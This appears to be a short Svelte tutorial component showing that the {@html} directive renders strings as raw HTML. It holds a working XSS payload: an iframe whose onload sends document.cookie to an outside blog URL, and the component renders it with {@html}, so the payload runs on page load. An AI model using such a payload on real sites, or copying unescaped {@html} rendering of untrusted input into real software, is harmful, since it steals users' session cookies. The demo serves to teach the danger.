<script>
	let h1 = '<h1>heropy</h1>';
	// let xss = '<iframe onload="alert(1)"></iframe>';
	let xss =
		'<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>';
</script>

<!-- @html 을 넣어주면 문자열을 html 해석해서 출력한다 -->
{@html h1}
{@html xss}
